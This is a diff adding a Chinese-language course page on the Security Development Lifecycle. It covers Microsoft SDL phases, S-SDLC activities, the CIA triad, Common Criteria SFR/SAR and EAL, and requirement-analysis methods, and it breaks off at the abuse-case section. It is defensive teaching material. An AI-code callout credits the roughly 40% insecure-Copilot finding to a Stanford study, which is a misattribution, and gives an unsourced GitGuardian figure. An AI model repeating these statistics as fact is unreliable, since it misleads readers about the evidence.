@@ -1,0 +1,1627 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>第6章 安全开发生命周期 · 网络空间安全</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;600;700&family=JetBrains+Mono:wght@400;600&family=Noto+Sans+SC:wght@300;400;500;700&display=swap');
+
+  :root {
+    --bg: #0d1117;
+    --bg2: #161b22;
+    --bg3: #1c2333;
+    --border: #30363d;
+    --text: #e6edf3;
+    --muted: #7d8590;
+    --accent: #e85d2f;
+    --accent2: #f0a04b;
+    --accent3: #58a6ff;
+    --green: #3fb950;
+    --red: #f85149;
+    --yellow: #d29922;
+    --purple: #bc8cff;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Noto Sans SC', sans-serif;
+    font-weight: 300;
+    line-height: 1.75;
+  }
+
+  /* ── Sidebar ── */
+  #sidebar {
+    position: fixed; left: 0; top: 0; bottom: 0;
+    width: 260px;
+    background: var(--bg2);
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    z-index: 100;
+    padding: 28px 0 40px;
+  }
+  #sidebar::-webkit-scrollbar { width: 4px; }
+  #sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  .sidebar-logo {
+    padding: 0 24px 24px;
+    border-bottom: 1px solid var(--border);
+    margin-bottom: 16px;
+  }
+  .sidebar-logo .ch {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--accent);
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    margin-bottom: 4px;
+  }
+  .sidebar-logo h2 {
+    font-family: 'Noto Serif SC', serif;
+    font-size: 15px;
+    font-weight: 700;
+    color: var(--text);
+    line-height: 1.4;
+  }
+
+  .nav-section-title {
+    padding: 10px 24px 4px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: .1em;
+    text-transform: uppercase;
+    color: var(--muted);
+  }
+  .nav-link {
+    display: block;
+    padding: 7px 24px;
+    font-size: 13px;
+    color: var(--muted);
+    text-decoration: none;
+    transition: color .15s, background .15s;
+    border-left: 2px solid transparent;
+  }
+  .nav-link:hover { color: var(--text); background: rgba(255,255,255,.04); }
+  .nav-link.active { color: var(--accent2); border-left-color: var(--accent2); background: rgba(240,160,75,.06); }
+
+  /* ── Main ── */
+  #main {
+    margin-left: 260px;
+    min-height: 100vh;
+  }
+
+  /* ── Hero ── */
+  #hero {
+    background: linear-gradient(135deg, #0d1117 0%, #1a1f2e 50%, #0d1117 100%);
+    border-bottom: 1px solid var(--border);
+    padding: 80px 64px 72px;
+    position: relative;
+    overflow: hidden;
+  }
+  #hero::before {
+    content: '';
+    position: absolute;
+    top: -100px; right: -100px;
+    width: 500px; height: 500px;
+    background: radial-gradient(circle, rgba(232,93,47,.12) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+  #hero::after {
+    content: '';
+    position: absolute;
+    bottom: -80px; left: 200px;
+    width: 400px; height: 400px;
+    background: radial-gradient(circle, rgba(88,166,255,.06) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+  #hero > * { position: relative; z-index: 1; }
+  .hero-eyebrow {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    letter-spacing: .15em;
+    text-transform: uppercase;
+    margin-bottom: 16px;
+  }
+  #hero h1 {
+    font-family: 'Noto Serif SC', serif;
+    font-size: 42px;
+    font-weight: 700;
+    line-height: 1.2;
+    color: #fff;
+    margin-bottom: 20px;
+  }
+  #hero h1 span { color: var(--accent2); }
+  .hero-sub {
+    font-size: 15px;
+    color: var(--muted);
+    max-width: 560px;
+    margin-bottom: 36px;
+    line-height: 1.8;
+  }
+  .hero-tags { display: flex; gap: 10px; flex-wrap: wrap; }
+  .tag {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 5px 14px;
+    border-radius: 20px;
+    border: 1px solid var(--border);
+    font-size: 12px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    letter-spacing: .05em;
+  }
+  .tag.hot { border-color: rgba(232,93,47,.4); color: var(--accent2); background: rgba(232,93,47,.08); }
+  .tag.info { border-color: rgba(88,166,255,.3); color: var(--accent3); background: rgba(88,166,255,.06); }
+
+  /* ── Content ── */
+  .content { padding: 0 64px 80px; }
+
+  section { margin-top: 72px; scroll-margin-top: 20px; }
+
+  h2.section-title {
+    font-family: 'Noto Serif SC', serif;
+    font-size: 26px;
+    font-weight: 700;
+    color: #fff;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  h2.section-title .num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent);
+    background: rgba(232,93,47,.12);
+    border: 1px solid rgba(232,93,47,.3);
+    padding: 2px 10px;
+    border-radius: 4px;
+    letter-spacing: .1em;
+  }
+  .section-divider {
+    height: 1px;
+    background: linear-gradient(to right, var(--accent) 0%, var(--border) 30%, transparent 100%);
+    margin: 12px 0 28px;
+  }
+
+  h3.sub-title {
+    font-size: 17px;
+    font-weight: 500;
+    color: var(--accent2);
+    margin: 28px 0 12px;
+    padding-left: 12px;
+    border-left: 3px solid var(--accent);
+  }
+
+  p { color: #c9d1d9; font-size: 15px; margin-bottom: 14px; line-height: 1.8; }
+
+  /* ── Cards ── */
+  .card-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 16px; margin: 16px 0; }
+  .card {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 20px;
+    transition: border-color .2s, transform .2s;
+  }
+  .card:hover { border-color: var(--accent2); transform: translateY(-2px); }
+  .card-icon {
+    font-size: 24px;
+    margin-bottom: 10px;
+    display: block;
+  }
+  .card h4 {
+    font-size: 14px;
+    font-weight: 700;
+    color: var(--text);
+    margin-bottom: 6px;
+  }
+  .card p { font-size: 13px; margin: 0; color: var(--muted); line-height: 1.65; }
+  .card.accent-red { border-left: 3px solid var(--red); }
+  .card.accent-yellow { border-left: 3px solid var(--yellow); }
+  .card.accent-blue { border-left: 3px solid var(--accent3); }
+  .card.accent-green { border-left: 3px solid var(--green); }
+  .card.accent-purple { border-left: 3px solid var(--purple); }
+  .card.accent-orange { border-left: 3px solid var(--accent); }
+
+  /* ── Tables ── */
+  .table-wrap { overflow-x: auto; margin: 16px 0 24px; border-radius: 8px; border: 1px solid var(--border); }
+  table { width: 100%; border-collapse: collapse; font-size: 13.5px; }
+  thead tr { background: var(--bg3); }
+  th {
+    padding: 12px 16px;
+    text-align: left;
+    font-weight: 600;
+    font-size: 12px;
+    letter-spacing: .06em;
+    text-transform: uppercase;
+    color: var(--muted);
+    white-space: nowrap;
+    border-bottom: 1px solid var(--border);
+  }
+  td {
+    padding: 11px 16px;
+    border-bottom: 1px solid rgba(48,54,61,.6);
+    color: #c9d1d9;
+    vertical-align: top;
+    line-height: 1.65;
+  }
+  tr:last-child td { border-bottom: none; }
+  tbody tr:hover td { background: rgba(255,255,255,.025); }
+  td:first-child { color: var(--text); font-weight: 500; }
+
+  /* ── Code ── */
+  .code-block {
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    overflow: hidden;
+    margin: 16px 0 24px;
+  }
+  .code-header {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 8px 16px;
+    border-bottom: 1px solid var(--border);
+    background: var(--bg3);
+  }
+  .code-lang {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--muted);
+    letter-spacing: .08em;
+  }
+  pre {
+    margin: 0;
+    padding: 20px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    overflow-x: auto;
+    color: #e2c77d;
+  }
+  .comment { color: var(--muted); }
+  .keyword { color: #ff7b72; }
+  .string { color: #a5d6ff; }
+  .func { color: #d2a8ff; }
+
+  /* ── Callout ── */
+  .callout {
+    display: flex; gap: 14px;
+    padding: 16px 20px;
+    border-radius: 8px;
+    margin: 16px 0 24px;
+    border: 1px solid;
+  }
+  .callout-icon { font-size: 18px; flex-shrink: 0; margin-top: 2px; }
+  .callout-body { font-size: 14px; line-height: 1.7; }
+  .callout.warn { background: rgba(210,153,34,.08); border-color: rgba(210,153,34,.3); color: #e3c46a; }
+  .callout.info { background: rgba(88,166,255,.07); border-color: rgba(88,166,255,.25); color: #88c0ff; }
+  .callout.danger { background: rgba(248,81,73,.07); border-color: rgba(248,81,73,.25); color: #f09090; }
+  .callout.success { background: rgba(63,185,80,.07); border-color: rgba(63,185,80,.25); color: #82d99a; }
+  .callout strong { color: inherit; font-weight: 700; }
+
+  /* ── Badge ── */
+  .badge {
+    display: inline-block;
+    padding: 2px 9px;
+    border-radius: 12px;
+    font-size: 11px;
+    font-family: 'JetBrains Mono', monospace;
+    font-weight: 600;
+    letter-spacing: .04em;
+  }
+  .badge-red { background: rgba(248,81,73,.15); color: #f85149; border: 1px solid rgba(248,81,73,.3); }
+  .badge-yellow { background: rgba(210,153,34,.15); color: #d29922; border: 1px solid rgba(210,153,34,.3); }
+  .badge-blue { background: rgba(88,166,255,.12); color: #58a6ff; border: 1px solid rgba(88,166,255,.3); }
+  .badge-green { background: rgba(63,185,80,.12); color: #3fb950; border: 1px solid rgba(63,185,80,.3); }
+  .badge-purple { background: rgba(188,140,255,.12); color: #bc8cff; border: 1px solid rgba(188,140,255,.3); }
+
+  /* ── Principle list ── */
+  .principle-list { list-style: none; display: flex; flex-direction: column; gap: 10px; margin: 16px 0 24px; }
+  .principle-list li {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 12px 16px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    font-size: 14px;
+    color: #c9d1d9;
+    line-height: 1.65;
+  }
+  .principle-list li .pl-num {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--accent);
+    background: rgba(232,93,47,.12);
+    padding: 2px 7px;
+    border-radius: 4px;
+    flex-shrink: 0;
+    margin-top: 1px;
+  }
+  .principle-list li strong { color: var(--text); }
+
+  /* ── Timeline (SDL history) ── */
+  .timeline { position: relative; padding-left: 28px; margin: 20px 0; }
+  .timeline::before {
+    content: '';
+    position: absolute; left: 0; top: 6px; bottom: 0;
+    width: 2px;
+    background: linear-gradient(to bottom, var(--accent), transparent);
+  }
+  .tl-item { position: relative; margin-bottom: 20px; }
+  .tl-item::before {
+    content: '';
+    position: absolute; left: -33px; top: 6px;
+    width: 10px; height: 10px;
+    border-radius: 50%;
+    background: var(--accent2);
+    border: 2px solid var(--bg);
+    box-shadow: 0 0 0 2px var(--accent2);
+  }
+  .tl-year {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    color: var(--accent2);
+    font-weight: 700;
+    margin-bottom: 4px;
+  }
+  .tl-title { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 4px; }
+  .tl-desc { font-size: 13px; color: var(--muted); line-height: 1.65; }
+
+  /* ── STRIDE table special ── */
+  .stride-s { color: #f85149; }
+  .stride-t { color: #d29922; }
+  .stride-r { color: #f0a04b; }
+  .stride-i { color: #58a6ff; }
+  .stride-d { color: #bc8cff; }
+  .stride-e { color: #3fb950; }
+
+  /* ── Case study banner ── */
+  .case-banner {
+    background: linear-gradient(135deg, rgba(88,166,255,.08), rgba(232,93,47,.06));
+    border: 1px solid rgba(88,166,255,.2);
+    border-radius: 10px;
+    padding: 24px 28px;
+    margin: 20px 0 28px;
+  }
+  .case-banner .case-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px;
+    letter-spacing: .12em;
+    text-transform: uppercase;
+    color: var(--accent3);
+    margin-bottom: 8px;
+  }
+  .case-banner h3 { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 6px; }
+  .case-banner p { font-size: 13.5px; color: var(--muted); margin: 0; }
+
+  /* ── Output vs Removed toc ── */
+  .removed-note {
+    font-size: 12px; color: var(--muted); font-style: italic;
+    padding: 8px 16px;
+    border-left: 2px solid var(--border);
+    margin: 8px 0 0;
+  }
+
+  /* ── Footer ── */
+  footer {
+    margin-left: 260px;
+    border-top: 1px solid var(--border);
+    padding: 28px 64px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  /* ── Responsive ── */
+  @media (max-width: 900px) {
+    #sidebar { display: none; }
+    #main, footer { margin-left: 0; }
+    .content, #hero, footer { padding-left: 24px; padding-right: 24px; }
+    #hero h1 { font-size: 28px; }
+  }
+
+  /* ── Resource links ── */
+  .resource-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap: 12px; margin: 16px 0 24px; }
+  .resource-card {
+    display: flex; align-items: flex-start; gap: 12px;
+    padding: 14px 16px;
+    background: var(--bg2);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    text-decoration: none;
+    transition: border-color .2s, transform .2s;
+  }
+  .resource-card:hover { border-color: var(--accent3); transform: translateY(-1px); }
+  .resource-card .rc-icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+  .resource-card .rc-body {}
+  .resource-card .rc-title { font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+  .resource-card .rc-desc { font-size: 12px; color: var(--muted); line-height: 1.5; }
+  .resource-card .rc-tag {
+    display: inline-block; margin-top: 5px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; padding: 1px 7px; border-radius: 10px;
+    background: rgba(88,166,255,.1); color: var(--accent3);
+    border: 1px solid rgba(88,166,255,.25);
+  }
+
+  /* ── AI compare block ── */
+  .compare-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 12px 0 20px; }
+  .compare-bad { border-left: 3px solid var(--red); background: rgba(248,81,73,.05); }
+  .compare-good { border-left: 3px solid var(--green); background: rgba(63,185,80,.05); }
+  .compare-label {
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 10px; letter-spacing: .08em; text-transform: uppercase;
+    margin-bottom: 8px; font-weight: 700;
+  }
+  .compare-bad .compare-label { color: var(--red); }
+  .compare-good .compare-label { color: var(--green); }
+
+  /* ── AI callout color ── */
+  .callout.ai { background: rgba(188,140,255,.07); border-color: rgba(188,140,255,.3); color: #d4bbff; }
+
+  /* Scroll spy active */
+  .nav-link { cursor: pointer; }
+</style>
+</head>
+<body>
+
+<!-- Sidebar -->
+<nav id="sidebar">
+  <div class="sidebar-logo">
+    <div class="ch">Chapter 06</div>
+    <h2>安全开发<br>生命周期</h2>
+    <div class="removed-note">已删除：纯软工过程模型（瀑布/迭代/比喻类）</div>
+  </div>
+
+  <div class="nav-section-title">§1 概览</div>
+  <a class="nav-link active" href="#overview">现状与问题分类</a>
+  <a class="nav-link" href="#models">SDLC / SDL / DevSecOps</a>
+
+  <div class="nav-section-title">§2 安全需求</div>
+  <a class="nav-link" href="#req-def">需求定义与属性</a>
+  <a class="nav-link" href="#req-std">CC标准 / SFR / SAR</a>
+  <a class="nav-link" href="#req-methods">分析方法</a>
+  <a class="nav-link" href="#abuse-case">滥用案例</a>
+  <a class="nav-link" href="#square">SQUARE过程</a>
+
+  <div class="nav-section-title">§3 安全设计</div>
+  <a class="nav-link" href="#design-principles">设计原则（13条）</a>
+  <a class="nav-link" href="#input-trust">输入验证与信任边界</a>
+  <a class="nav-link" href="#threat-model">威胁建模 + STRIDE</a>
+
+  <div class="nav-section-title">§4 安全测试</div>
+  <a class="nav-link" href="#test-overview">测试概述</a>
+  <a class="nav-link" href="#static-dynamic">静态 / 动态分析</a>
+  <a class="nav-link" href="#fuzz">模糊测试</a>
+  <a class="nav-link" href="#pentest">渗透测试</a>
+
+  <div class="nav-section-title">§5 发布与部署</div>
+  <a class="nav-link" href="#release">最终审查 / PSIRT</a>
+  <a class="nav-link" href="#vuln-mgmt">漏洞管理成熟度</a>
+
+  <div class="nav-section-title">★ 案例</div>
+  <a class="nav-link" href="#case-bank">银行系统综合案例</a>
+
+  <div class="nav-section-title">§6 AI Coding 时代</div>
+  <a class="nav-link" href="#ai-threat">AI 代码的安全风险</a>
+  <a class="nav-link" href="#ai-tools">AI 驱动的安全工具</a>
+  <a class="nav-link" href="#ai-sdl">SDL 如何应对</a>
+
+  <div class="nav-section-title">📚 学习资源</div>
+  <a class="nav-link" href="#resources">延伸阅读与工具</a>
+</nav>
+
+<!-- Main -->
+<div id="main">
+
+<!-- Hero -->
+<header id="hero">
+  <div class="hero-eyebrow">安全编程课程 · 第6章</div>
+  <h1>安全开发<span>生命周期</span><br>Security Development Lifecycle</h1>
+  <p class="hero-sub">
+    从需求到部署，将安全实践嵌入软件全生命周期。本章聚焦可直接落地的方法论——滥用案例、STRIDE威胁建模、SAST/DAST、渗透测试——以及它们在真实工作与科研中的应用。
+  </p>
+  <div class="hero-tags">
+    <span class="tag hot">🔥 威胁建模 STRIDE</span>
+    <span class="tag hot">🔥 SQUARE 需求工程</span>
+    <span class="tag hot">🤖 AI Coding 安全</span>
+    <span class="tag info">SDL / DevSecOps</span>
+    <span class="tag info">Fuzz Testing</span>
+    <span class="tag info">渗透测试 PTES</span>
+    <span class="tag">CC / EAL 标准</span>
+  </div>
+</header>
+
+<div class="content">
+
+<!-- §1 Overview -->
+<section id="overview">
+  <h2 class="section-title"><span class="num">§1</span>软件安全现状与问题根源</h2>
+  <div class="section-divider"></div>
+
+  <p>安全漏洞不是偶然出现的，它们是开发流程中特定决策失误的直接产物。下表来自奇安信互联网安全中心的数据，说明工程水平与缺陷密度的关联：</p>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>组织类型</th><th>缺陷密度（个/千行）</th><th>对应工程特征</th></tr></thead>
+      <tbody>
+        <tr><td>普通软件工程师</td><td><span class="badge badge-red">50 – 250</span></td><td>无过程规范、无代码审查</td></tr>
+        <tr><td>普通软件开发公司</td><td><span class="badge badge-yellow">4 – 40</span></td><td>有基础测试，安全意识薄弱</td></tr>
+        <tr><td>高水平软件开发公司</td><td><span class="badge badge-blue">2 – 4</span></td><td>引入安全开发流程</td></tr>
+        <tr><td>NASA</td><td><span class="badge badge-green">0.1</span></td><td>净室工程 + 形式化验证</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">四类问题根源</h3>
+  <div class="card-grid">
+    <div class="card accent-red">
+      <span class="card-icon">⚙️</span>
+      <h4>系统软件安全</h4>
+      <p>需求/设计阶段引入缺陷，导致 OS 或数据库存在漏洞。后果：系统崩溃、权限提升。</p>
+    </div>
+    <div class="card accent-yellow">
+      <span class="card-icon">📦</span>
+      <h4>应用软件安全</h4>
+      <p>开发人员缺乏安全培训，设计未考虑安全性。后果：恶意攻击、数据泄露。</p>
+    </div>
+    <div class="card accent-blue">
+      <span class="card-icon">🔗</span>
+      <h4>第三方代码安全</h4>
+      <p>依赖含漏洞的开源库且未审查。后果：供应链攻击（如 Log4Shell）。</p>
+    </div>
+    <div class="card accent-purple">
+      <span class="card-icon">🏭</span>
+      <h4>新技术安全</h4>
+      <p>工业设备联网、IoT 接入互联网，新型漏洞面扩大。后果：设备被控、生产中断。</p>
+    </div>
+  </div>
+
+  <div class="callout warn">
+    <span class="callout-icon">⚠️</span>
+    <div class="callout-body"><strong>核心结论：</strong>漏洞的根本原因不是"代码写错了"，而是<strong>开发流程中缺乏系统性的安全活动</strong>——这正是 SDL / S-SDLC / DevSecOps 要解决的问题。</div>
+  </div>
+
+  <div class="callout ai">
+    <span class="callout-icon">🤖</span>
+    <div class="callout-body"><strong>2024 年新变量：AI 生成代码正在成为第五类漏洞来源。</strong>斯坦福大学 2021 年研究发现，GitHub Copilot 生成的代码样本中约 40% 含有安全缺陷（CWE 覆盖 SQL 注入、缓冲区溢出等）。2023 年 GitGuardian 报告显示，开发者将含密钥的代码粘贴给 AI 助手后导致的密钥泄露事件同比增长 67%。AI Coding 工具不改变漏洞的本质，但加快了漏洞的生产速度。→ <a href="#ai-threat" style="color:inherit;text-decoration:underline">见 §6 详细分析</a></div>
+  </div>
+</section>
+
+<!-- §1 Models -->
+<section id="models">
+  <h2 class="section-title"><span class="num">§1.2</span>SDLC → S-SDLC → SDL → DevSecOps</h2>
+  <div class="section-divider"></div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>概念</th><th>提出时间</th><th>核心推动者</th><th>关键特征</th></tr></thead>
+      <tbody>
+        <tr>
+          <td>SDLC</td><td>1960s–70s</td><td>Royce、Boehm</td>
+          <td>以功能开发为核心，安全仅在测试阶段关注</td>
+        </tr>
+        <tr>
+          <td>S-SDLC</td><td>2000s</td><td>NIST、OWASP</td>
+          <td>将安全活动嵌入每个阶段（需求→设计→编码→测试→部署）</td>
+        </tr>
+        <tr>
+          <td><strong>SDL</strong></td><td>2004</td><td>微软（Bill Gates、Michael Howard）</td>
+          <td>7阶段强制流程；引入威胁建模、代码审查；2006年公开白皮书</td>
+        </tr>
+        <tr>
+          <td>DevSecOps</td><td>2012–15</td><td>Shannon Lietz、Gartner</td>
+          <td>安全左移；SAST/DAST/SCA 集成进 CI/CD；安全即代码</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">微软 SDL 7 阶段（工业界标准参考）</h3>
+  <div class="timeline">
+    <div class="tl-item">
+      <div class="tl-year">阶段 1</div>
+      <div class="tl-title">培训 Training</div>
+      <div class="tl-desc">全员安全意识培训——开发、测试、PM 均需参与。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 2</div>
+      <div class="tl-title">要求 Requirements</div>
+      <div class="tl-desc">确定安全质量门、安全/隐私风险评估。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 3</div>
+      <div class="tl-title">设计 Design</div>
+      <div class="tl-desc">攻击面分析 + 威胁建模（STRIDE），制定缓解措施。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 4</div>
+      <div class="tl-title">实现 Implementation</div>
+      <div class="tl-desc">安全编码规范，禁用不安全 API，代码审计。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 5</div>
+      <div class="tl-title">验证 Verification</div>
+      <div class="tl-desc">安全测试（SAST / DAST / Fuzz），全面核查攻击面。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 6</div>
+      <div class="tl-title">发布 Release</div>
+      <div class="tl-desc">最终安全审查（FSR），建立响应计划，完善安全文档。</div>
+    </div>
+    <div class="tl-item">
+      <div class="tl-year">阶段 7</div>
+      <div class="tl-title">响应 Response</div>
+      <div class="tl-desc">响应安全事件与漏洞报告，实施修复与应急响应。</div>
+    </div>
+  </div>
+
+  <div class="callout info">
+    <span class="callout-icon">💡</span>
+    <div class="callout-body"><strong>SDL 的工业影响：</strong>微软推广 SDL 后，Windows Vista 的漏洞数量相比 XP 显著下降。SDL 已被 ISO/IEC 27034 等标准采纳，是求职安全岗位时面试官会问到的核心框架。</div>
+  </div>
+
+  <h3 class="sub-title">S-SDLC 各阶段安全活动</h3>
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>阶段</th><th>主导团队</th><th>关键安全活动</th></tr></thead>
+      <tbody>
+        <tr><td>需求分析</td><td>产品 + 安全团队</td><td>制定安全需求（如支持生物识别认证）</td></tr>
+        <tr><td>设计与威胁建模</td><td>安全 + 架构师</td><td>STRIDE 分析、攻击面分析、加密协议设计</td></tr>
+        <tr><td>编码与实现</td><td>开发 + 安全审查</td><td>SAST 扫描、修复 XSS / 注入漏洞</td></tr>
+        <tr><td>测试与验证</td><td>测试 + 安全</td><td>DAST 扫描、渗透测试、模糊测试</td></tr>
+        <tr><td>部署与运维</td><td>运维 + 安全基线</td><td>容器镜像扫描、日志监控告警</td></tr>
+        <tr><td>持续监控与响应</td><td>SOC</td><td>应急响应（IR）、漏洞补丁推送</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<!-- §2 Req Def -->
+<section id="req-def">
+  <h2 class="section-title"><span class="num">§2</span>安全需求——定义与属性</h2>
+  <div class="section-divider"></div>
+
+  <p>安全需求是为保障业务功能，对相关信息的 <strong>机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）</strong> 提出的要求，即 CIA 三元组。</p>
+
+  <div class="card-grid">
+    <div class="card accent-blue">
+      <span class="card-icon">🔒</span>
+      <h4>机密性 Confidentiality</h4>
+      <p>防止敏感信息被未授权访问。技术手段：加密、访问控制、最小特权。</p>
+    </div>
+    <div class="card accent-yellow">
+      <span class="card-icon">✅</span>
+      <h4>完整性 Integrity</h4>
+      <p>防止数据被未授权篡改或破坏。技术手段：哈希、数字签名、MACs。</p>
+    </div>
+    <div class="card accent-green">
+      <span class="card-icon">⚡</span>
+      <h4>可用性 Availability</h4>
+      <p>确保授权用户能正常使用系统。技术手段：冗余、限流、DDoS 防护。</p>
+    </div>
+  </div>
+
+  <h3 class="sub-title">三种安全需求定义视角</h3>
+  <ul class="principle-list">
+    <li><span class="pl-num">视角1</span><div>将安全需求作为<strong>非功能性需求</strong>，从安全角度补充产品特性描述。</div></li>
+    <li><span class="pl-num">视角2</span><div>将安全需求视为与业务功能同等重要的<strong>安全功能需求</strong>，开发人员必须实现。</div></li>
+    <li><span class="pl-num">视角3</span><div>使用<strong>安全策略或质量需求</strong>来定义安全需求（如 CC 标准的 SFR / SAR 体系）。</div></li>
+  </ul>
+</section>
+
+<!-- §2 Std -->
+<section id="req-std">
+  <h2 class="section-title"><span class="num">§2.2</span>CC标准：SFR 与 SAR</h2>
+  <div class="section-divider"></div>
+
+  <p>CC（Common Criteria，ISO/IEC 15408）是目前最通用的软件安全性评估国际标准，广泛用于政府、金融、电信等关键领域。CC 将安全需求分为两类：</p>
+
+  <div class="card-grid">
+    <div class="card accent-orange">
+      <span class="card-icon">🛡️</span>
+      <h4>SFR — 安全功能需求</h4>
+      <p>系统必须提供哪些安全功能？</p>
+    </div>
+    <div class="card accent-purple">
+      <span class="card-icon">📋</span>
+      <h4>SAR — 安全保障需求</h4>
+      <p>如何证明这些安全功能是可信的？</p>
+    </div>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>SFR 类别</th><th>示例说明</th></tr></thead>
+      <tbody>
+        <tr><td>安全审计</td><td>记录用户登录失败、管理员权限修改等敏感操作</td></tr>
+        <tr><td>通信安全 / 不可抵赖</td><td>防止信息被篡改，通信行为可追踪（加密、签名）</td></tr>
+        <tr><td>密码支持</td><td>提供加密、解密、哈希等功能</td></tr>
+        <tr><td>用户数据保护</td><td>访问控制、权限隔离、防越权</td></tr>
+        <tr><td>标识和鉴别</td><td>账户登录、两步验证</td></tr>
+        <tr><td>安全管理</td><td>管理员操作控制、安全策略配置</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="table-wrap">
+    <table>
+      <thead><tr><th>SAR 类别</th><th>说明</th></tr></thead>
+      <tbody>
+        <tr><td>配置管理</td><td>记录源码版本、构建方式，防止发布混乱</td></tr>
+        <tr><td>安全开发过程审计</td><td>安全设计是否文档化、是否经过评审</td></tr>
+        <tr><td>安全目标与保护轮廓</td><td>系统的威胁模型、安全目标、资产定义</td></tr>
+        <tr><td>安全交付与部署</td><td>发布时是否防篡改、是否有签名安装包</td></tr>
+        <tr><td>漏洞评估与维护</td><td>是否定期漏洞扫描、是否有更新修补机制</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <h3 class="sub-title">安全保障级别 EAL</h3>
+  <p>CC 定义了 EAL1–EAL7 七个评估级别，对系统安全可信度要求递增。EAL4 是多数商业产品的上限，EAL6–7 用于军事/航天等高保障场景。</p>
+  <div class="callout info">
+    <span class="callout-icon">📌</span>
+    <div class="callout-body"><strong>科研对接：</strong>发表安全系统论文时，CC 的 SFR/SAR 框架可作为安全需求描述的标准参考。"我们的系统满足 EAL3 的 SAR.ALC 要求"——这类表述是顶会/顶刊审稿人认可的表达方式。</div>
+  </div>
+</section>
+
+<!-- §2 Methods -->
+<section id="req-methods">
+  <h2 class="section-title"><span class="num">§2.3</span>安全需求分析方法</h2>
+  <div class="section-divider"></div>
+
+  <p>安全需求分析方法均是对传统需求分析方法的扩展，核心思路是：在传统需求中融入<strong>攻击者视角</strong>。主要方法有三种：</p>
+
+  <div class="card-grid">
+    <div class="card accent-red">
+      <span class="card-icon">⚔️</span>
+      <h4>滥用案例 Abuse Case</h4>
+      <p>在 UML 用例图中引入攻击者，描述攻击者与系统的交互，生成对应的安全需求用例。</p>
+    </div>
+    <div class="card accent-yellow">
+      <span class="card-icon">🗺️</span>
+      <h4>滥用框架 Abuse Frame</h4>
+      <p>扩展问题框架，引入攻击者领域，通过威胁图和安全需求描述图刻画系统面临的安全问题。</p>
+    </div>
+    <div class="card accent-blue">
+      <span class="card-icon">📐</span>
+      <h4>SQUARE 过程</h4>
+      <p>SEI 开发的 9 步安全需求工程流程，适合大型项目，需安全专家参与。</p>
+    </div>
+  </div>
+</section>
+
+<!-- §2 Abuse Case -->
+<section id="abuse-case">
+  <h2 class="section-title"><span class="num">§2.4</span>滥用案例详解</h2>
+  <div class="section-divider"></div>
+
+  <p>滥用案例是对传统 UML 用例的安全扩展，通过将自己置于<strong>攻击者视角</strong>来识别系统漏洞。有两种变体：</p>
+
+  <div class="card-grid">
+    <div class="card accent-orange">
+      <h4>误用用例（Misuse Case）</h4>
